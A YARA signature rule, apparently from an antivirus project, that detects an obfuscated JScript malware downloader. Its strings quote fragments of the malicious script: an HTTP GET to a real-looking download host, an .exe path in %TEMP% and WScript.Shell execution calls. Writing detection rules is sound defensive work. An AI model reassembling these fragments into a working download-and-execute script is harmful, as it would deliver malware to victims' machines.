rule sig_20160328_2db9dff51190a2fd26eda009a42e747a {
  meta:
    description = "datamaliciousorder - file 20160328_2db9dff51190a2fd26eda009a42e747a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e5210c77c2398c72fe79fb2101fdbc832a2e5e7eb81f153e41b0d374b7405807"

  strings:
    $s1  = "function Hwhlkepjvh() {return Itlfrgkmnb[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"cWTNqQHkdZxWbCEK.exe\";};" fullword ascii
    $s2  = "Yilbcnm[Xpbzb](\"GET\", \"http://2biking.com/k4isfa\", false);" fullword ascii
    $s3  = "do {WScript[Okrzhbzdzk](Samjro() * 11)} while (Yilbcnm[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Ieerh(Ecpnqvrp, Nudcfpdb){return Ecpnqvrp - Nudcfpdb;};" fullword ascii
    $s5  = "var Itlfrgkmnb = function Gspkqctfze() {return WScript[Rztxenkw](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Drkqhreyv() {return ((Mznryv == true) && (Mznryv == Ffomztwxm)) ? 1 : Nsxhb;};" fullword ascii
    $s7  = "function Tzynvxnjj(Grkqrdvw){Itlfrgkmnb[\"Run\"](Grkqrdvw, Nsxhb, Nsxhb);};" fullword ascii
    $s8  = "Mznryv = true; " fullword ascii
    $s9  = "var Mznryv = false;" fullword ascii
    $s10 = "var Ljturdqgfj = false;" fullword ascii
    $s11 = "function Levizkcwbz(Hcvexcm) {var Mvjxbtbmbm = (1, 2, 3, 4, 5, Hcvexcm); return Mvjxbtbmbm;};" fullword ascii
    $s12 = "function Bfvqfjz()" fullword ascii
    $s13 = " while (Klejfyqrdk){" fullword ascii
    $s14 = "Ffomztwxm = true; " fullword ascii
    $s15 = "function Jenmfirw(){return Snvavpnslh;};" fullword ascii
    $s16 = "var Ffomztwxm = false;" fullword ascii
    $s17 = "function Nzzjfcu(){return Rztxenkw;};" fullword ascii
    $s18 = "function Samjro(){return 22;};" fullword ascii
    $s19 = "return Ieerh(Znnnhctevv, Bvddax);" fullword ascii
    $s20 = "var Xxqgn = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}